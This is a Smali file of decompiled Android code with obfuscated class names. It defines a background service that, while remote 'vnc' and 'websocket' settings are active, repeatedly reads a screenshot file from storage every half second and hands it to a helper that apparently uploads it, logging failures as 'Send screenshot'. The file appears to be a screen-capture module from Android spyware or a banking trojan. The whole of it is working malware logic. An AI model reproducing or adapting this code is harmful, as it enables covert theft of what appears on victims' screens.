.class public Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;
.super Landroid/app/IntentService;


# instance fields
.field public a:I


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, "nvsdtnxkzjgw"

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    const/4 v0, 0x0

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->a:I

    return-void
.end method


# virtual methods
.method protected onHandleIntent(Landroid/content/Intent;)V
    .locals 4

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    const-string v1, "vnc"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "stop"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_0

    const-string v1, "websocket"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_1

    :cond_0
    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->stopService(Landroid/content/Intent;)Z

    :cond_1
    :goto_0
    :try_start_0
    sget-object v1, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v2, 0x1f4

    invoke-virtual {v1, v2, v3}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_1

    :catch_0
    move-exception v1

    :try_start_1
    invoke-virtual {v1}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_1
    const-string v1, "vnc"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, "stop"

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-nez v1, :cond_3

    const-string v1, "websocket"

    invoke-virtual {v0, p0, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    const-string v2, ""

    invoke-virtual {v1, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v1

    if-eqz v1, :cond_2

    goto :goto_2

    :cond_2
    new-instance v1, Ljava/io/File;

    const/4 v2, 0x0

    invoke-virtual {p0, v2}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->getExternalFilesDir(Ljava/lang/String;)Ljava/io/File;

    move-result-object v2

    const-string v3, "screenshot.jpg"

    invoke-direct {v1, v2, v3}, Ljava/io/File;-><init>(Ljava/io/File;Ljava/lang/String;)V

    invoke-static {v1}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/io/File;)[B

    move-result-object v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    iget v3, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->a:I

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v3, ".jpg"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, p0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;[BLjava/lang/String;)V

    iget v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->a:I

    add-int/lit8 v1, v1, 0x1

    iput v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->a:I

    iget v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->a:I

    const/16 v2, 0xb

    if-lt v1, v2, :cond_1

    const/4 v1, 0x0

    iput v1, p0, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->a:I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_0

    :cond_3
    :goto_2
    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/qvhy/nvsdtnxkzjgw;->stopService(Landroid/content/Intent;)Z

    return-void

    :catch_1
    const-string v1, "error"

    const-string v2, "Send screenshot"

    invoke-virtual {v0, v1, v2}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    goto :goto_0
.end method
